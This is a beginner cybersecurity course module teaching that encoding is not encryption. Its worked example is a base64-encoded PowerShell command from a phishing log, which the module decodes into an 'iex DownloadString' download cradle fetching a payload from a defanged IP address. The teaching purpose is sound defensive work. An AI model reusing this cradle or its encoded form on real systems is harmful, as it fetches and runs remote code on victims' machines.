# Module 08 — Data & Encoding

*Variant D · misconception, predict-then-reveal ("call it before you read on"). [Go to the hands-on lab →](lab.md)*

*Last reviewed: 2026-06*

**Foundations** — *the same skill that decodes a malware command decodes any encoded artifact. Learn it on a real one.*

<!-- module-meta -->
**Difficulty:** Beginner &nbsp;·&nbsp; **Estimated time:** ~3–4 hrs (study + lab) &nbsp;·&nbsp; **Prerequisites:** Earlier Foundations modules
{ .module-meta }


## The artifact

Open a Windows event log after a phishing click and you will, sooner or later, meet a line like this —
a process-creation event (Sysmon Event ID 1) recording how `powershell.exe` was launched:

```
powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3Ry
aW5nKCdodHRwOi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==
```

The `-enc` flag (short for `-EncodedCommand`) tells PowerShell: *the next argument is base64; decode it
and run it.* Commodity malware loaders — the families behind a huge share of real phishing waves, Emotet
among them — lean on this constantly. The actual command never appears in plaintext on the command line;
what a hasty analyst (or a naive log filter searching for the word `DownloadString`) sees is that wall of
letters ending in `==`.

So before you read another line, **commit to an answer.** Being wrong here is the point — this is the
single misconception this module exists to kill.

## Call it before you read on

> **Q1.** The malware put its command in base64. **Is that encryption — is the payload secret?**
>
> **Q2.** To read what this PowerShell actually does, **what do you need** — a key, a password, a
> cracking tool, or none of those?
>
> **Q3.** That `==` on the end. Is it a signature, a checksum, a key… or something more boring?

Write down your three answers. Now the reveal.

## The verdict

**Q1 — No. Encoding is not encryption.** This is the load-bearing distinction in this module and one
you will lean on for the rest of the curriculum. **Encoding** reshapes data into a safe-to-transport
alphabet; it is *reversible by anyone, with no key.* base64, hex, and URL/percent-encoding all exist so
that arbitrary bytes survive a channel that only likes certain characters — base64 squeezes any bytes
into 64 printable symbols (A–Z, a–z, 0–9, `+`, `/`); hex writes each byte as two characters `00`–`ff`;
URL-encoding rewrites unsafe characters as `%2F`-style escapes so a path survives a URL. **Encryption**
is the opposite kind of thing: it makes data *unreadable without a key.* The malware author chose base64
not to hide the command from you — they can't, and they know it — but to slip it past *machines*: naive
filters and humans skimming for a keyword. Mistaking "it's base64, so it's protected" for security is a
real, common, expensive error; you will find production secrets "protected" by nothing but base64 in the
wild. **The mental model: encoding changes the *clothes* data wears, not whether it's *locked*. Only
crypto — the next module — locks it.**

**Q2 — None of those. You just decode it, and so can anyone.** `echo '<the blob>' | base64 -d` reverses
it instantly. (PowerShell's `-enc` adds one wrinkle: it expects the text in UTF-16LE, so you pipe the
result through `iconv -f utf-16le` to read it cleanly — an encoding detail, still not a secret.) Decoded,
our example reads:

```
iex (New-Object Net.WebClient).DownloadString('hXXp://185.220.101[.]47/payload.ps1')
```

`iex` is `Invoke-Expression` — *run this string as code* — and `DownloadString` pulls the next stage off
the internet. This is a "download cradle" (MITRE ATT&CK [T1059.001](https://attack.mitre.org/techniques/T1059/001/)
+ [T1105](https://attack.mitre.org/techniques/T1105/)). The point that should land: **decoding it required
no privilege you don't already have.** The defense base64 provided was zero. (We *defang* the URL —
`hXXp`, `[.]` — by convention, so it can't be clicked or auto-fetched; that's hygiene, not decryption.)

**Q3 — The most boring option: padding.** base64 works in groups of 3 bytes → 4 characters. When the
input doesn't divide evenly by 3, base64 pads the final group with `=` (one or two of them) to fill it
out. So a trailing `=` or `==` is a strong *tell* that you're looking at base64 — not a key, not a
checksum, just the encoding announcing its own math. Learning to read these tells on sight — `==` for
base64, neat pairs of `0`–`9a`–`f` for hex, `%` escapes for URL — is most of the skill.

The deeper transferable point is that **the very skill that decoded a malware command decodes any
encoded artifact.** A token in a config file, a value in an API response, a hex dump in a forensics tool,
a payload in a web-server log — same alphabets, same reversibility, same one-layer-at-a-time peel. Real
data is often *layered* (a payload base64'd inside URL-encoding inside JSON), so the move is peeling one
layer at a time and re-checking what alphabet you're now looking at — exactly what a tool like CyberChef
lets you *see*, transformation by transformation. In the lab you'll peel a layered blob, read a hex dump,
URL-decode an attack from a log, and query a real JSON feed — and prove to yourself that none of it was
ever secret.

## Learn (~2 hrs)

*Deliberately short — the spine above is yours to own. Read these to nail the mechanics, not to relearn
the model.*

- [RFC 4648 — Base16, Base32, Base64 data encodings](https://www.rfc-editor.org/rfc/rfc4648) (~30 min, skim §4 + §8) — the primary source. Read the base64 alphabet table and the padding rules; that's the `==` you predicted, defined by the standard itself.
- [MDN — Percent-encoding / `encodeURIComponent`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) (~15 min) — why URLs need `%2F`-style escaping and which characters are "unsafe"; the mechanism behind the path-traversal you'll decode.
- [jq manual](https://jqlang.github.io/jq/manual/) (~30 min, hands-on) — slice and filter JSON from the command line. Don't read it cover to cover; work the "Basic filters" examples, then reach for it during the lab.
- [CISA AA25-141B — LummaC2 Malware](https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141b) (~15 min) — a real government advisory whose "ClickFix" technique runs a base64-encoded PowerShell command; see the encoded-PowerShell trick with real indicators of compromise.
- [CyberChef](https://gchq.github.io/CyberChef/) (~15 min, play) — "the cyber swiss-army knife"; build a recipe to peel a layered base64/hex/URL blob and *watch* each layer come off.

## Key concepts
- **Encoding ≠ encryption** — reversible-by-anyone reshaping for transport, not secrecy; only a key-based cipher locks data
- Reading the tells: `==` padding ⇒ base64 · pairs of `0`–`9`/`a`–`f` ⇒ hex · `%XX` escapes ⇒ URL/percent
- Hex and ASCII; reading a hex dump (where forensics and malware analysis live)
- base64 / base64url and the 3-byte → 4-char rule that produces the padding
- Layered data: peel one encoding at a time, re-identify the alphabet underneath
- JSON structure and querying it with `jq`

## AI acceleration
Models identify and decode an unknown blob instantly — paste it and ask "what is this?" Genuinely useful
as a first pass. But it's also a perfect adversary to check, because it makes exactly the errors this
module is about: it will sometimes call a base64 blob "encrypted," and on *layered* data it will guess the
wrong peel order and hand you confident garbage. Decode it yourself — by hand or in CyberChef — and you'll
catch both. The tool is fast; the confirmation is yours, and you own the verdict on what the artifact says.
